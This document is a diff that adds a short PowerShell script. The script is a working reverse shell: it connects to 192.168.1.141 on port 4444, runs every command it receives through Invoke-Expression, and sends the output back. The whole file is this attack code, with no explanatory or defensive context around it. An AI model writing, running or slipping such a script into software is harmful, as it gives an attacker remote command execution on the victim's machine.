@@ -1,0 +1,28 @@
+$LHOST = "192.168.1.141"
+$LPORT = 4444
+$TCPClient = New-Object System.Net.Sockets.TCPClient
+$TCPClient.Connect($LHOST, $LPORT)
+$NetworkStream = $TCPClient.GetStream()
+$StreamReader = New-Object System.IO.StreamReader($NetworkStream)
+$StreamWriter = New-Object System.IO.StreamWriter($NetworkStream)
+$StreamWriter.AutoFlush = $true
+
+while ($TCPClient.Connected) {
+    if ($NetworkStream.DataAvailable) {
+        $Command = $StreamReader.ReadLine()
+        if ($Command) {
+            try {
+                $Output = Invoke-Expression $Command 2>&1 | Out-String
+            } catch {
+                $Output = $_.Exception.Message
+            }
+            $StreamWriter.WriteLine($Output)
+        }
+    }
+    Start-Sleep -Milliseconds 100
+}
+
+$StreamWriter.Close()
+$StreamReader.Close()
+$NetworkStream.Close()
+$TCPClient.Close()
